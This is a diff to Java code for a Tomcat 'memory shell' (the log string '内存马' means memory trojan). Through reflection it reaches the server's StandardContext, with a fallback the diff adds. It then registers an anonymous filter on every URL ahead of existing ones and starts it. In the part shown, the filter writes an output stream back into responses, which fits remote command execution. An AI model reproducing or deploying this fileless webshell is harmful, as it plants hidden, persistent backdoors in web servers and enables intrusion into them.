@@ -23,21 +23,34 @@ public class MTomcatFilter  {
             String filterName = MTomcatFilter.class.getSimpleName();
 
             WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
 
+            StandardContext standardContext;
+
+            try {
+                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+            } catch (Exception ignored) {
+                Class webappClassLoaderBaseClz = Class.forName("org.apache.catalina.loader.WebappClassLoaderBase");
+                Field field = webappClassLoaderBaseClz.getDeclaredField("resources");
+                field.setAccessible(true);
+                Object root   = field.get(webappClassLoaderBase);
+
+                Field  field2 = root.getClass().getDeclaredField("context");
+                field2.setAccessible(true);
+                standardContext = (StandardContext) field2.get(root);
+            }
 
             System.out.println(standardContext.getClass()+"???");
-            Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
+//            Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
 
-            filterConfigs.setAccessible(true);
-            HashMap hashMap = (HashMap) filterConfigs.get(standardContext);
+//            filterConfigs.setAccessible(true);
+//            HashMap hashMap = (HashMap) filterConfigs.get(standardContext);
 
-            if (hashMap.get(filterName) == null) {
+//            if (hashMap.get(filterName) == null) {
 
                 Filter filter = new Filter() {
                     @Override
                     public void init(FilterConfig filterConfig) throws ServletException {
-                        Filter.super.init(filterConfig);
+//                        Filter.super.init(filterConfig);
                         System.out.println("内存马init");
                     }
 
@@ -58,15 +71,14 @@ public class MTomcatFilter  {
                                 response.getWriter().println(outputStream.toString());
                             }
                         }
-
-
                     }
 
                     @Override
                     public void destroy() {
-                        Filter.super.destroy();
+//                        Filter.super.destroy();
                     }
                 };
+
                 FilterDef filterDef = new FilterDef();
                 filterDef.setFilter(filter);
                 filterDef.setFilterName(filterName);
@@ -74,17 +86,23 @@ public class MTomcatFilter  {
                 standardContext.addFilterDef(filterDef);
 
                 FilterMap filterMap = new FilterMap();
-                filterMap.addURLPattern("/*");
+                filterMap.addURLPattern("*");
                 filterMap.setFilterName(filterName);
                 filterMap.setDispatcher(DispatcherType.REQUEST.name());
                 standardContext.addFilterMapBefore(filterMap);
 
-                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
-                constructor.setAccessible(true);
-                ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
-                hashMap.put(filterName, applicationFilterConfig);
-            }
+                standardContext.filterStart();
+
+//                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+//                constructor.setAccessible(true);
+//                ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+//                hashMap.put(filterName, applicationFilterConfig);
+
+//            }else{
+//
+//            }
         }  catch(Exception e) {
+            System.out.println("error");
             e.printStackTrace();
         }
     }
